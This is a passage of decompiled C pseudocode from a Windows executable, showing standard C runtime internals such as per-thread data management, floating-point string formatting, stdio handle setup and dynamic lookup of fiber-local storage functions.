  __crt_seh_guarded_call<void>::operator()<_lambda_5e887d1dcbef67a5eb4283622ba103bf_,_lambda_4466841279450cc726390878d4a41900_ &,_lambda_341c25c0346d94847f1f3c463c57e077_>(
    (__int64)&v7,
    &v2,
    (__int64)v6,
    &v1);
}


// ===== ?destroy_fls@@YAXPEAX@Z @ 0x140007ca8 size=0x20 =====
void __fastcall destroy_fls(struct __acrt_ptd *Block)
{
  if ( Block != nullptr )
  {
    destroy_ptd_array(Block);
    free_base(Block);
  }
}


// ===== ?destroy_ptd_array@@YAXQEAU__acrt_ptd@@@Z @ 0x140007cc8 size=0xf5 =====
void __fastcall destroy_ptd_array(void **a1)
{
  unsigned int v1; // [rsp+20h] [rbp-20h] BYREF
  unsigned int v2; // [rsp+24h] [rbp-1Ch] BYREF
  void **v3; // [rsp+28h] [rbp-18h] BYREF
  void ***v4; // [rsp+30h] [rbp-10h] BYREF
  void ***v5; // [rsp+38h] [rbp-8h] BYREF
  char v6; // [rsp+58h] [rbp+18h] BYREF
  unsigned int v7; // [rsp+60h] [rbp+20h] BYREF
  unsigned int v8; // [rsp+68h] [rbp+28h] BYREF

  v3 = a1;
  v4 = &v3;
  v7 = 5;
  v8 = 5;
  v5 = &v3;
  v1 = 4;
  v2 = 4;
  if ( *a1 != &unk_140011FA0 )
  {
    free_base(*a1);
    a1 = v3;
  }
  free_base(a1[14]);
  free_base(v3[11]);
  free_base(v3[12]);
  free_base(v3[13]);
  free_base(v3[9]);
  free_base(v3[10]);
  free_base(v3[15]);
  free_base(v3[16]);
  free_base(v3[120]);
  __crt_seh_guarded_call<void>::operator()<_lambda_46352004c1216016012b18bd6f87e700_,_lambda_3bd07e1a1191394380780325891bf33f_ &,_lambda_334532d3f185bcaa59b5be82d7d22bff_>(
    (__int64)&v6,
    &v8,
    (__int64)&v4,
    &v7);
  __crt_seh_guarded_call<void>::operator()<_lambda_fb3a7dec4e47f37f22dae91bb15c9095_,_lambda_698284760c8add0bfb0756c19673e34b_ &,_lambda_dfb8eca1e75fef3034a8fb18dd509707_>(
    (__int64)&v6,
    &v2,
    (struct __acrt_ptd *const **)&v5,
    &v1);
}


// ===== ?replace_current_thread_locale_nolock@@YAXQEAU__acrt_ptd@@QEAU__crt_locale_data@@@Z @ 0x140007dc0 size=0x67 =====
void __fastcall replace_current_thread_locale_nolock(struct __acrt_ptd *const a1, struct __crt_locale_data *const a2)
{
  wchar_t **v4; // rcx

  if ( *((_QWORD *)a1 + 18) != 0 )
  {
    _acrt_release_locale_ref();
    v4 = *((wchar_t ***)a1 + 18);
    if ( v4 != (wchar_t **)qword_14001D340 && v4 != &off_14001C160 && *((_DWORD *)v4 + 4) == 0 )
      _acrt_free_locale(v4);
  }
  *((_QWORD *)a1 + 18) = a2;
  if ( a2 != nullptr )
    _acrt_add_locale_ref(a2);
}


// ===== __acrt_getptd @ 0x140007e28 size=0x94 =====
struct __acrt_ptd *_acrt_getptd()
{
  DWORD LastError; // ebx
  struct __acrt_ptd *v1; // rdi
  struct __acrt_ptd *v2; // rax
  struct __acrt_ptd *v3; // rcx
  int v4; // eax

  LastError = GetLastError();
  if ( dwTlsIndex == -1 || (v1 = (struct __acrt_ptd *)_vcrt_FlsFree_0(dwTlsIndex)) == nullptr )
  {
    v2 = (struct __acrt_ptd *)calloc_base(1u, 0x3C8u);
    v1 = v2;
    if ( v2 == nullptr )
    {
      v3 = nullptr;
LABEL_5:
      free_base(v3);
      goto LABEL_10;
    }
    v4 = _acrt_FlsSetValue(dwTlsIndex, v2);
    v3 = v1;
    if ( v4 == 0 )
      goto LABEL_5;
    construct_ptd_array(v1);
    free_base(nullptr);
  }
  if ( v1 == nullptr )
  {
LABEL_10:
    SetLastError(LastError);
    abort();
  }
  SetLastError(LastError);
  return v1;
}


// ===== __acrt_getptd_noexit @ 0x140007ebc size=0x9f =====
struct __acrt_ptd *_acrt_getptd_noexit()
{
  __int64 v0; // rsi
  DWORD LastError; // ebx
  struct __acrt_ptd *v2; // rdi
  struct __acrt_ptd *v3; // rax
  struct __acrt_ptd *v4; // rcx
  int v5; // eax

  v0 = 0;
  LastError = GetLastError();
  if ( dwTlsIndex == -1 || (v2 = (struct __acrt_ptd *)_vcrt_FlsFree_0(dwTlsIndex)) == nullptr )
  {
    v3 = (struct __acrt_ptd *)calloc_base(1u, 0x3C8u);
    v2 = v3;
    if ( v3 == nullptr )
    {
      v4 = nullptr;
LABEL_5:
      free_base(v4);
      goto LABEL_9;
    }
    v5 = _acrt_FlsSetValue(dwTlsIndex, v3);
    v4 = v2;
    if ( v5 == 0 )
      goto LABEL_5;
    construct_ptd_array(v2);
    free_base(nullptr);
  }
  if ( v2 != nullptr )
  {
    SetLastError(LastError);
    return v2;
  }
LABEL_9:
  SetLastError(LastError);
  return (struct __acrt_ptd *)v0;
}


// ===== __acrt_initialize_ptd @ 0x140007f5c size=0x39 =====
char _acrt_initialize_ptd()
{
  dwTlsIndex = _acrt_FlsAlloc(destroy_fls);
  if ( dwTlsIndex == -1 )
    return 0;
  if ( _acrt_getptd_noexit() == nullptr )
  {
    _vcrt_uninitialize_ptd_0(0);
    return 0;
  }
  return 1;
}


// ===== __vcrt_uninitialize_ptd_0 @ 0x140007f98 size=0x22 =====
char _vcrt_uninitialize_ptd_0()
{
  if ( dwTlsIndex != -1 )
  {
    _acrt_FlsFree(dwTlsIndex);
    dwTlsIndex = -1;
  }
  return 1;
}


// ===== sub_140007FBC @ 0x140007fbc size=0x31 =====
__int64 __fastcall sub_140007FBC(__int64 a1, __int64 *a2)
{
  __int64 result; // rax

  result = qword_14001D340;
  if ( *a2 != qword_14001D340 )
  {
    result = *(unsigned int *)(a1 + 936);
    if ( ((unsigned int)result & dword_14001C8C0) == 0 )
    {
      result = _acrt_update_thread_locale_data();
      *a2 = result;
    }
  }
  return result;
}


// ===== sub_140007FF0 @ 0x140007ff0 size=0x31 =====
__int64 __fastcall sub_140007FF0(__int64 a1, __int64 *a2)
{
  __int64 result; // rax

  result = (__int64)off_14001C4F8;
  if ( (void *)*a2 != off_14001C4F8 )
  {
    result = *(unsigned int *)(a1 + 936);
    if ( ((unsigned int)result & dword_14001C8C0) == 0 )
    {
      result = _acrt_update_thread_multibyte_data();
      *a2 = result;
    }
  }
  return result;
}


// ===== ?__acrt_fp_classify@@YA?AW4__acrt_fp_class@@AEBN@Z @ 0x140008024 size=0x65 =====
__int64 __fastcall __acrt_fp_classify(__int64 *a1)
{
  __int64 v1; // rdx

  v1 = *a1;
  if ( (((unsigned __int64)*a1 >> 52) & 0x7FF) != 0x7FF )
    return 0;
  if ( (v1 & 0xFFFFFFFFFFFFFLL) == 0 )
    return 1;
  if ( v1 < 0 && (v1 & 0xFFFFFFFFFFFFFLL) == 0x8000000000000LL )
    return 4;
  return ((v1 & 0x8000000000000LL) == 0) | 2u;
}


// ===== ?fp_format_a@@YAHQEBNPEAD_KQEAD2H_NIQEAU__crt_locale_pointers@@@Z @ 0x14000808c size=0x35d =====
__int64 __fastcall fp_format_a(
        const double *a1,
        char *a2,
        unsigned __int64 a3,
        char *const a4,
        unsigned __int64 a5,
        int a6,
        bool a7,
        unsigned int a8,
        struct __crt_locale_pointers *const a9)
{
  unsigned __int64 v9; // rbx
  char *v10; // rdi
  unsigned int v14; // ebx
  char *v15; // rax
  __int64 v16; // rbp
  char *v17; // rdi
  __m128i *v18; // r14
  __m128i *v19; // rdi
  __int16 v20; // r8
  unsigned __int64 v21; // r9
  unsigned __int16 v22; // ax
  __int8 *i; // rcx
  __int64 v24; // rcx
  __int8 *v25; // rdi
  __int8 *v26; // r8
  _QWORD v28[3]; // [rsp+50h] [rbp-38h] BYREF
  char v29; // [rsp+68h] [rbp-20h]

  v9 = (unsigned int)a6;
  v10 = a2;
  *a2 = 0;
  if ( a6 < 0 )
    v9 = 0;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v28, a9);
  if ( a3 <= (int)v9 + 11 )
  {
    v14 = 34;
    *errno() = 34;
    invalid_parameter_noinfo();
    goto LABEL_50;
  }
  if ( ((*(_QWORD *)a1 >> 52) & 0x7FFLL) == 0x7FF )
  {
    v14 = fp_format_e(a1, v10, a3, a4, a5, v9, false, a8, nullptr);
    if ( v14 != 0 )
    {
      *v10 = 0;
      goto LABEL_50;
    }
    v15 = strrchr(v10, 101);
    if ( v15 != nullptr )
    {
      *v15 = a7 ? 80 : 112;
      v15[3] = 0;
    }
  }
  else
  {
    if ( *(__int64 *)a1 < 0 )
      *v10++ = 45;
    v16 = 1023;
    if ( (*(_QWORD *)a1 & 0x7FF0000000000000LL) != 0 )
    {
      *v10 = 49;
      v17 = v10 + 1;
    }
    else
    {
      *v10 = 48;
      v17 = v10 + 1;
      v16 = (*(_QWORD *)a1 & 0xFFFFFFFFFFFFFLL) != 0 ? 0x3FE : 0;
    }
    v18 = (__m128i *)v17;
    v19 = (__m128i *)(v17 + 1);
    if ( (_DWORD)v9 != 0 )
      v18->m128i_i8[0] = ***(_BYTE ***)(v28[1] + 248LL);
    else
      v18->m128i_i8[0] = 0;
    if ( (*(_QWORD *)a1 & 0xFFFFFFFFFFFFFLL) != 0 )
    {
      v20 = 48;
      v21 = 0xF000000000000LL;
      do
      {
        if ( (int)v9 <= 0 )
          break;
        v22 = ((v21 & *(_QWORD *)a1 & 0xFFFFFFFFFFFFFLL) >> v20) + 48;
        if ( v22 > 0x39u )
          LOBYTE(v22) = (a7 ? 7 : 39) + v22;
        v19->m128i_i8[0] = v22;
        v9 = (unsigned int)(v9 - 1);
        v19 = (__m128i *)((char *)v19 + 1);
        v21 >>= 4;
        v20 -= 4;
      }
      while ( v20 >= 0 );
      if ( v20 >= 0 && (unsigned __int16)((v21 & *(_QWORD *)a1 & 0xFFFFFFFFFFFFFLL) >> v20) > 8u )
      {
        for ( i = &v19[-1].m128i_i8[15]; ((*i - 70) & 0xDF) == 0; --i )
          *i = 48;
        if ( i == (__int8 *)v18 )
        {
          ++*(i - 1);
        }
        else if ( *i == 57 )
        {
          *i = a7 ? 65 : 97;
        }
        else
        {
          ++*i;
        }
      }
    }
    if ( (int)v9 > 0 )
    {
      sub_140002F60(v19, 0x30u, v9);
      v19 = (__m128i *)((char *)v19 + v9);
    }
    if ( v18->m128i_i8[0] == 0 )
      v19 = v18;
    v19->m128i_i8[0] = a7 ? 80 : 112;
    v24 = ((*(_QWORD *)a1 >> 52) & 0x7FFLL) - v16;
    if ( v24 < 0 )
    {
      v19->m128i_i8[1] = 45;
      v25 = &v19->m128i_i8[2];
      v24 = -v24;
    }
    else
    {
      v19->m128i_i8[1] = 43;
      v25 = &v19->m128i_i8[2];
    }
    *v25 = 48;
    v26 = v25;
    if ( v24 >= 1000 && (*v25 = v24 / 1000 + 48, ++v25, v24 %= 1000, v25 != v26) || v24 >= 100 )
    {
      *v25++ = v24 / 100 + 48;
      v24 %= 100;
    }
    if ( v25 != v26 || v24 >= 10 )
    {
      *v25++ = v24 / 10 + 48;
      v24 %= 10;
    }
    *v25 = v24 + 48;
    v25[1] = 0;
  }
  v14 = 0;
LABEL_50:
  if ( v29 != 0 )
    *(_DWORD *)(v28[0] + 936LL) &= ~2u;
  return v14;
}


// ===== ?fp_format_e@@YAHQEBNQEAD_K12H_NIQEAU__crt_locale_pointers@@@Z @ 0x1400083ec size=0xcd =====
int __fastcall fp_format_e(
        const double *const a1,
        char *const a2,
        unsigned __int64 a3,
        char *const a4,
        unsigned __int64 a5,
        int a6,
        bool a7,
        unsigned int a8,
        struct __crt_locale_pointers *const a9)
{
  _BOOL8 v11; // rcx
  _BOOL8 v12; // rax
  __int64 v13; // rdx
  int result; // eax
  _DWORD v15[6]; // [rsp+40h] [rbp-18h] BYREF

  _acrt_fltout(*(_QWORD *)a1, (unsigned int)(a6 + 1), v15, a4, a5);
  v11 = v15[0] == 45;
  v12 = a6 > 0;
  v13 = a3 - v12 - v11;
  if ( a3 == -1 )
    v13 = -1;
  result = _acrt_fp_strflt_to_string(&a2[v12 + v11], v13, (unsigned int)(a6 + 1), v15);
  if ( result == 0 )
    return fp_format_e_internal(a2, a3, a6, a7, a8, (struct _strflt *const)v15, false, a9);
  *a2 = 0;
  return result;
}


// ===== ?fp_format_e_internal@@YAHQEAD_KH_NIQEAU_strflt@@2QEAU__crt_locale_pointers@@@Z @ 0x1400084bc size=0x1db =====
__int64 __fastcall fp_format_e_internal(
        char *const a1,
        unsigned __int64 a2,
        int a3,
        char a4,
        unsigned int a5,
        struct _strflt *const a6,
        bool a7,
        struct __crt_locale_pointers *const a8)
{
  int v8; // eax
  __int64 v9; // rbx
  const __m128i *v14; // rdx
  __int64 v15; // r8
  char *v16; // rdx
  char *v17; // rbx
  rsize_t v18; // rdx
  __m128i *v19; // rcx
  int v20; // r8d
  _QWORD v21[3]; // [rsp+30h] [rbp-28h] BYREF
  char v22; // [rsp+48h] [rbp-10h]

  v8 = 0;
  v9 = a3;
  if ( a3 > 0 )
    v8 = a3;
  if ( a2 > v8 + 9 )
  {
    _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v21, a8);
    if ( a7 )
    {
      v14 = (const __m128i *)&a1[*(_DWORD *)a6 == 45];
      if ( (int)v9 > 0 )
      {
        v15 = -1;
        do
          ++v15;
        while ( v14->m128i_i8[v15] != 0 );
        sub_1400036D0((__m128i *)((char *)v14 + ((int)v9 > 0)), v14, v15 + 1);
      }
    }
    v16 = a1;
    if ( *(_DWORD *)a6 == 45 )
    {
      *a1 = 45;
      v16 = a1 + 1;
    }
    if ( (int)v9 > 0 )
    {
      *v16 = v16[1];
      *++v16 = ***(_BYTE ***)(v21[1] + 248LL);
    }
    v17 = &v16[v9 + !a7];
    v18 = a1 - v17 + a2;
    if ( a2 == -1 )
      v18 = -1;
    if ( strcpy_s(v17, v18, "e+000") != 0 )
      invoke_watson(nullptr, nullptr, nullptr, 0, 0);
    v19 = (__m128i *)(v17 + 2);
    if ( a4 != 0 )
      *v17 = 69;
    if ( **((_BYTE **)a6 + 1) != 48 )
    {
      v20 = *((_DWORD *)a6 + 1) - 1;
      if ( v20 < 0 )
      {
        v20 = 1 - *((_DWORD *)a6 + 1);
        v17[1] = 45;
      }
      if ( v20 >= 100 )
      {
        v17[2] += v20 / 100;
        v20 %= 100;
      }
      if ( v20 >= 10 )
      {
        v17[3] += v20 / 10;
        LOBYTE(v20) = v20 % 10;
      }
      v17[4] += v20;
    }
    if ( a5 == 2 && v19->m128i_i8[0] == 48 )
      sub_1400036D0(v19, (const __m128i *)(v17 + 3), 3u);
    if ( v22 != 0 )
      *(_DWORD *)(v21[0] + 936LL) &= ~2u;
    return 0;
  }
  else
  {
    *errno() = 34;
    invalid_parameter_noinfo();
    return 34;
  }
}


// ===== ?fp_format_f_internal@@YAHQEAD_KHQEAU_strflt@@_NQEAU__crt_locale_pointers@@@Z @ 0x140008698 size=0x148 =====
__int64 __fastcall fp_format_f_internal(
        char *const a1,
        __int64 a2,
        int a3,
        struct _strflt *const a4,
        bool a5,
        struct __crt_locale_pointers *const a6)
{
  int v9; // ecx
  __int64 v10; // rsi
  __int64 v11; // r8
  char *v12; // rbx
  char *v13; // rbp
  __int64 v14; // r8
  int v15; // ecx
  _QWORD v17[3]; // [rsp+20h] [rbp-28h] BYREF
  char v18; // [rsp+38h] [rbp-10h]

  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)v17, a6);
  v9 = *((_DWORD *)a4 + 1) - 1;
  if ( a5 && v9 == a3 )
    *(_WORD *)&a1[(*(_DWORD *)a4 == 45) + v9] = 48;
  if ( *(_DWORD *)a4 == 45 )
    *a1++ = 45;
  v10 = -1;
  if ( *((int *)a4 + 1) > 0 )
  {
    v12 = &a1[*((int *)a4 + 1)];
  }
  else
  {
    v11 = -1;
    do
      ++v11;
    while ( a1[v11] != 0 );
    sub_1400036D0((__m128i *)(a1 + 1), (const __m128i *)a1, v11 + 1);
    *a1 = 48;
    v12 = a1 + 1;
  }
  if ( a3 > 0 )
  {
    v13 = v12 + 1;
    v14 = -1;
    do
      ++v14;
    while ( v12[v14] != 0 );
    sub_1400036D0((__m128i *)(v12 + 1), (const __m128i *)v12, v14 + 1);
    *v12 = ***(_BYTE ***)(v17[1] + 248LL);
    v15 = *((_DWORD *)a4 + 1);
    if ( v15 < 0 )
    {
      if ( a5 || -v15 < a3 )
        a3 = -v15;
      if ( a3 != 0 )
      {
        do
          ++v10;
        while ( v13[v10] != 0 );
        sub_1400036D0((__m128i *)&v13[a3], (const __m128i *)(v12 + 1), v10 + 1);
      }
      sub_140002F60((__m128i *)(v12 + 1), 0x30u, a3);
    }
  }
  if ( v18 != 0 )
    *(_DWORD *)(v17[0] + 936LL) &= ~2u;
  return 0;
}


// ===== ?fp_format_g@@YAHQEBNQEAD_K12H_NIQEAU__crt_locale_pointers@@@Z @ 0x1400087e0 size=0x137 =====
__int64 __fastcall fp_format_g(
        const double *const a1,
        char *const a2,
        unsigned __int64 a3,
        char *const a4,
        unsigned __int64 a5,
        unsigned int a6,
        char a7,
        unsigned int a8,
        struct __crt_locale_pointers *const a9)
{
  __int64 v9; // rcx
  _BOOL8 v12; // rcx
  int v13; // r14d
  __int64 v14; // rdx
  char *v15; // rbx
  __int64 result; // rax
  int v17; // eax
  char v18; // al
  _QWORD v19[3]; // [rsp+40h] [rbp-18h] BYREF

  v9 = *(_QWORD *)a1;
  v19[0] = 0;
  v19[1] = 0;
  _acrt_fltout(v9, a6, v19, a4, a5);
  v12 = LODWORD(v19[0]) == 45;
  v13 = HIDWORD(v19[0]) - 1;
  v14 = a3 - v12;
  v15 = &a2[v12];
  if ( a3 == -1 )
    v14 = -1;
  result = _acrt_fp_strflt_to_string(&a2[v12], v14, a6, v19);
  if ( (_DWORD)result != 0 )
  {
    *a2 = 0;
  }
  else
  {
    v17 = HIDWORD(v19[0]) - 1;
    if ( HIDWORD(v19[0]) - 1 < -4 || v17 >= (int)a6 )
    {
      return fp_format_e_internal(a2, a3, a6, a7, a8, (struct _strflt *const)v19, true, a9);
    }
    else
    {
      if ( v13 < v17 )
      {
        do
          v18 = *v15++;
        while ( v18 != 0 );
        *(v15 - 2) = 0;
      }
      return fp_format_f_internal(a2, a3, a6, (struct _strflt *const)v19, true, a9);
    }
  }
  return result;
}


// ===== ?fp_format_nan_or_infinity@@YAHW4__acrt_fp_class@@_NPEAD_K1@Z @ 0x140008918 size=0x142 =====
errno_t __fastcall fp_format_nan_or_infinity(int a1, unsigned __int8 a2, char *a3, rsize_t a4, char a5)
{
  char *v6; // r9
  errno_t result; // eax
  __int64 v8; // rdx
  unsigned __int64 v9; // rax
  char *Source[16]; // [rsp+30h] [rbp-41h]

  v6 = a3;
  if ( a4 >= (unsigned __int64)a2 + 4 )
  {
    if ( a2 != 0 )
    {
      v6 = a3 + 1;
      *a3 = 45;
      --a4;
      a3[1] = 0;
    }
    Source[4] = (char *)&unk_140012300;
    Source[5] = (char *)&unk_140012300;
    Source[0] = (char *)&unk_1400122F8;
    Source[1] = (char *)&unk_1400122F8;
    Source[2] = (char *)&unk_1400122FC;
    Source[3] = (char *)&unk_1400122FC;
    Source[8] = "NAN(SNAN)";
    Source[10] = "nan(snan)";
    Source[12] = "NAN(IND)";
    Source[14] = "nan(ind)";
    Source[9] = (char *)&unk_140012300;
    Source[13] = (char *)&unk_140012300;
    Source[6] = (char *)&unk_140012304;
    v8 = 4LL * (unsigned int)(a1 - 1);
    Source[7] = (char *)&unk_140012304;
    Source[11] = (char *)&unk_140012304;
    Source[15] = (char *)&unk_140012304;
    v9 = -1;
    do
      ++v9;
    while ( (&Source[v8])[a5 != 0 ? 0 : 2][v9] != 0 );
    result = strcpy_s(v6, a4, (&(&Source[v8])[a5 != 0 ? 0 : 2])[a4 <= v9]);
    if ( result != 0 )
      invoke_watson(nullptr, nullptr, nullptr, 0, 0);
  }
  else
  {
    *a3 = 0;
    return 12;
  }
  return result;
}


// ===== __acrt_fp_format @ 0x140008a5c size=0x241 =====
errno_t __fastcall _acrt_fp_format(
        double *a1,
        char *a2,
        rsize_t a3,
        char *a4,
        unsigned __int64 a5,
        int a6,
        unsigned int a7,
        __int64 a8,
        struct __crt_locale_pointers *a9)
{
  errno_t result; // eax
  bool v14; // r14
  int v15; // eax
  unsigned int v16; // edi
  __int64 v17; // rcx
  _BOOL8 v18; // rcx
  __int64 v19; // rdx
  _QWORD v20[2]; // [rsp+50h] [rbp-38h] BYREF

  if ( a2 == nullptr || a3 == 0 || a4 == nullptr || a5 == 0 )
  {
    *errno() = 22;
    invalid_parameter_noinfo();
    return 22;
  }
  v14 = a6 == 65 || (unsigned int)(a6 - 69) <= 2;
  if ( (a8 & 8) == 0 )
  {
    v15 = __acrt_fp_classify((__int64 *)a1);
    if ( v15 != 0 )
      return fp_format_nan_or_infinity(v15, *(__int64 *)a1 < 0, a2, a3, v14);
  }
  v16 = ((a8 & 0x10) != 0) | 2;
  if ( a6 == 65 )
    return fp_format_a(a1, a2, a3, a4, a5, a7, v14, v16, a9);
  if ( a6 == 69 )
    return fp_format_e(a1, a2, a3, a4, a5, a7, v14, v16, a9);
  if ( a6 != 70 )
  {
    if ( a6 == 71 )
      return fp_format_g(a1, a2, a3, a4, a5, a7, v14, v16, a9);
    if ( a6 != 97 )
    {
      if ( a6 != 101 )
      {
        if ( a6 != 102 )
          return fp_format_g(a1, a2, a3, a4, a5, a7, v14, v16, a9);
        goto LABEL_21;
      }
      return fp_format_e(a1, a2, a3, a4, a5, a7, v14, v16, a9);
    }
    return fp_format_a(a1, a2, a3, a4, a5, a7, v14, v16, a9);
  }
LABEL_21:
  v17 = *(_QWORD *)a1;
  v20[0] = 0;
  v20[1] = 0;
  _acrt_fltout(v17, a7, v20, a4, a5);
  v18 = LODWORD(v20[0]) == 45;
  v19 = a3 - v18;
  if ( a3 == -1 )
    v19 = -1;
  result = _acrt_fp_strflt_to_string(&a2[v18], v19, a7 + HIDWORD(v20[0]), v20);
  if ( result == 0 )
    return fp_format_f_internal(a2, a3, a7, (struct _strflt *const)v20, false, a9);
  *a2 = 0;
  return result;
}


// ===== _fileno @ 0x140008ca0 size=0x26 =====
int __cdecl fileno(FILE *Stream)
{
  if ( Stream != nullptr )
    return Stream->_flag;
  *errno() = 22;
  invalid_parameter_noinfo();
  return -1;
}


// ===== _get_printf_count_output @ 0x140008cc8 size=0x18 =====
int __cdecl get_printf_count_output()
{
  return qword_14001D328 == (_security_cookie | 1);
}


// ===== ?initialize_inherited_file_handles_nolock@@YAXXZ @ 0x140008ce0 size=0xeb =====
void __fastcall initialize_inherited_file_handles_nolock()
{
  LPBYTE v0; // rsi
  __int64 v1; // rdi
  HANDLE *v2; // rbx
  __int64 v3; // rbp
  __int64 v4; // rcx
  struct _STARTUPINFOW v5; // [rsp+20h] [rbp-78h] BYREF

  GetStartupInfoW(&v5);
  if ( v5.cbReserved2 != 0 && v5.lpReserved2 != nullptr )
  {
    v0 = v5.lpReserved2 + 4;
    v1 = 0x2000;
    v2 = (HANDLE *)&v5.lpReserved2[*(_DWORD *)v5.lpReserved2 + 4];
    if ( *(int *)v5.lpReserved2 < 0x2000 )
      v1 = *(unsigned int *)v5.lpReserved2;
    _acrt_lowio_ensure_fh_exists((unsigned int)v1);
    if ( (int)v1 > dword_14001D750 )
      v1 = (unsigned int)dword_14001D750;
    if ( (_DWORD)v1 != 0 )
    {
      v3 = 0;
      do
      {
        if ( *v2 != (HANDLE)-1LL && *v2 != (HANDLE)-2LL && (*v0 & 1) != 0 && ((*v0 & 8) != 0 || GetFileType(*v2) != 0) )
        {
          v4 = qword_14001D350[v3 >> 6] + ((unsigned __int64)(v3 & 0x3F) << 6);
          *(_QWORD *)(v4 + 40) = *v2;
          *(_BYTE *)(v4 + 56) = *v0;
        }
        ++v3;
        ++v0;
        ++v2;
        --v1;
      }
      while ( v1 != 0 );
    }
  }
}


// ===== ?initialize_stdio_handles_nolock@@YAXXZ @ 0x140008dcc size=0xfb =====
void __fastcall initialize_stdio_handles_nolock()
{
  int v0; // edi
  __int64 v1; // r14
  unsigned __int64 v2; // rbx
  DWORD v3; // ecx
  HANDLE StdHandle; // rax
  HANDLE v5; // rsi
  DWORD FileType; // eax

  v0 = 0;
  v1 = 0;
  do
  {
    v2 = qword_14001D350[(__int64)v0 >> 6] + ((unsigned __int64)(v0 & 0x3F) << 6);
    if ( *(_QWORD *)(v2 + 40) == -2 || *(_QWORD *)(v2 + 40) == -1 )
    {
      *(_BYTE *)(v2 + 56) = -127;
      if ( v0 != 0 )
      {
        if ( v0 == 1 )
          v3 = -11;
        else
          v3 = -12;
      }
      else
      {
        v3 = -10;
      }
      StdHandle = GetStdHandle(v3);
      v5 = StdHandle;
      if ( (unsigned __int64)StdHandle + 1 <= 1 )
        FileType = 0;
      else
        FileType = GetFileType(StdHandle);
      if ( FileType != 0 )
      {
        *(_QWORD *)(v2 + 40) = v5;
        if ( (unsigned __int8)FileType == 2 )
        {
          *(_BYTE *)(v2 + 56) |= 0x40u;
        }
        else if ( (unsigned __int8)FileType == 3 )
        {
          *(_BYTE *)(v2 + 56) |= 8u;
        }
      }
      else
      {
        *(_BYTE *)(v2 + 56) |= 0x40u;
        *(_QWORD *)(v2 + 40) = -2;
        if ( Block != nullptr )
          *(_DWORD *)(*(_QWORD *)((char *)Block + v1) + 24LL) = -2;
      }
    }
    else
    {
      *(_BYTE *)(v2 + 56) |= 0x80u;
    }
    ++v0;
    v1 += 8;
  }
  while ( v0 != 3 );
}


// ===== __acrt_initialize_lowio @ 0x140008ec8 size=0x3b =====
char _acrt_initialize_lowio()
{
  char v0; // bl

  sub_14000AB5C(7);
  v0 = 0;
  if ( (unsigned int)_acrt_lowio_ensure_fh_exists(0) == 0 )
  {
    initialize_inherited_file_handles_nolock();
    initialize_stdio_handles_nolock();
    v0 = 1;
  }
  sub_14000ABB0(7);
  return v0;
}


// ===== __acrt_uninitialize_lowio @ 0x140008f04 size=0x40 =====
char _acrt_uninitialize_lowio()
{
  unsigned __int64 i; // rbx
  void *v1; // rcx

  for ( i = 0; i < 128; ++i )
  {
    v1 = (void *)qword_14001D350[i];
    if ( v1 != nullptr )
    {
      _acrt_lowio_destroy_handle_array(v1);
      qword_14001D350[i] = 0;
    }
  }
  return 1;
}


// ===== _calloc_base @ 0x140008f44 size=0x75 =====
void *__cdecl calloc_base(size_t Count, size_t Size)
{
  SIZE_T v2; // rbx
  void *result; // rax

  if ( Count != 0 && 0xFFFFFFFFFFFFFFE0uLL / Count < Size )
  {
LABEL_10:
    *errno() = 12;
    return nullptr;
  }
  else
  {
    v2 = Size * Count;
    if ( Size * Count == 0 )
      v2 = 1;
    while ( 1 )
    {
      result = HeapAlloc(hHeap, 8u, v2);
      if ( result != nullptr )
        break;
      if ( (unsigned int)sub_140006248() == 0 || callnewh(v2) == 0 )
        goto LABEL_10;
    }
  }
  return result;
}


// ===== ?try_get_function@@YAPEAXW4function_id@?A0x1dd686d3@@QEBDQEBW4module_id@2@2@Z @ 0x140008fbc size=0x1a0 =====
FARPROC __fastcall try_get_function(unsigned int a1, const CHAR *a2, unsigned int *a3, unsigned int *a4)
{
  __int64 v4; // r14
  unsigned int *v6; // rbp
  uintptr_t v8; // r10
  __int64 v9; // rdx
  FARPROC result; // rax
  __int64 v11; // rsi
  HMODULE Library; // rbx
  const WCHAR *v13; // r15

  v4 = a1;
  v6 = a3;
  v8 = _security_cookie;
  v9 = __ROR8__(qword_14001D800[a1] ^ _security_cookie, _security_cookie & 0x3F);
  if ( v9 == -1 )
    return nullptr;
  if ( v9 != 0 )
    return (FARPROC)v9;
  if ( a3 == a4 )
  {
LABEL_19:
    Library = nullptr;
    goto LABEL_20;
  }
  while ( 1 )
  {
    v11 = *v6;
    Library = (HMODULE)qword_14001D760[v11];
    if ( Library == nullptr )
      break;
    if ( Library != (HMODULE)-1LL )
      goto LABEL_23;
LABEL_17:
    if ( ++v6 == a4 )
    {
      v8 = _security_cookie;
      goto LABEL_19;
    }
  }
  v13 = off_1400129D0[v11];
  Library = LoadLibraryExW(v13, nullptr, 0x800u);
  if ( Library == nullptr )
  {
    if ( GetLastError() == 87 )
      Library = LoadLibraryExW(v13, nullptr, 0);
    else
      Library = nullptr;
  }
  if ( Library == nullptr )
  {
    _InterlockedExchange64(&qword_14001D760[v11], -1);
    goto LABEL_17;
  }
  if ( _InterlockedExchange64(&qword_14001D760[v11], (__int64)Library) != 0 )
    FreeLibrary(Library);
LABEL_23:
  v8 = _security_cookie;
LABEL_20:
  if ( Library != nullptr )
  {
    result = GetProcAddress(Library, a2);
    if ( result != nullptr )
    {
      _InterlockedExchange64(
        &qword_14001D800[v4],
        _security_cookie ^ __ROR8__(result, 64 - ((unsigned __int8)_security_cookie & 0x3Fu)));
      return result;
    }
    v8 = _security_cookie;
  }
  _InterlockedExchange64(&qword_14001D800[v4], v8 ^ __ROR8__(-1, 64 - ((unsigned __int8)v8 & 0x3Fu)));
  return nullptr;
}


// ===== __acrt_FlsAlloc @ 0x14000915c size=0x55 =====
DWORD __fastcall _acrt_FlsAlloc(__int64 a1)
{
  FARPROC function; // rax

  function = try_get_function(3u, "FlsAlloc", (unsigned int *)&unk_140012FB0, (unsigned int *)"FlsAlloc");
  if ( function != nullptr )
    return ((__int64 (__fastcall *)(__int64))function)(a1);
  else
    return TlsAlloc();
}


// ===== __acrt_FlsFree @ 0x1400091b4 size=0x55 =====
int __fastcall _acrt_FlsFree(DWORD dwTlsIndex)
{
  FARPROC function; // rax

  function = try_get_function(4u, "FlsFree", (unsigned int *)&unk_140012FC8, (unsigned int *)"FlsFree");
  if ( function != nullptr )
    return ((__int64 (__fastcall *)(_QWORD))function)(dwTlsIndex);
  else
    return TlsFree(dwTlsIndex);
}


